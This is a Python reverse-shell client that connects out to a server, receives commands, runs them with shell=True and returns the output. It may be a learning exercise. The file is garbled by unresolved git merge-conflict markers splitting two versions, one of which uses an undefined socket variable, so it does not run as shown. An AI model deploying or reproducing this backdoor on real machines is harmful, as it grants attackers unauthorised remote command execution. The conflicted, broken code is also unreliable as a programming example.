#!/usr/bin/python
import socket
import subprocess
<<<<<<< HEAD
import json
=======
>>>>>>> 4534365bb9a54fa25ab972a622eb399b28c269a9

def reliable_send(data):
    """Send JSON-encoded data to the server."""
    json_data = json.dumps(data)
    client.send(json_data.encode())

<<<<<<< HEAD
def reliable_recv():
    """Receive and decode JSON data from the server."""
    data = ""
    while True:
        try:
            chunk = client.recv(1024).decode()
            if not chunk:
                continue
            data += chunk
            return json.loads(data)
        except ValueError:
            continue

def execute_command(command):
    """Execute a system command and return the result."""
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

# Client setup
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client.connect(("127.0.0.1", 15555))  # Replace YOUR_SERVER_IP with the server's IP address
    print('host connected')
    while True:
        command = reliable_recv()
        if command == "q":
            break  # Exit the loop if "q" is received
        result = execute_command(command)
        reliable_send(result)
except Exception as e:
    print(f"Error: {e}")
finally:
    client.close()
=======
while True:
	command = sock.recv(1024) #bytes
	if command == "q": # if server stops communicating, break the loop
		print('Server closed the connection')
		break
	else:
		proc = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
		result = proc.stdout.read() + proc.stderr.read()
		sock.send(result)		
sock.close()
>>>>>>> 4534365bb9a54fa25ab972a622eb399b28c269a9
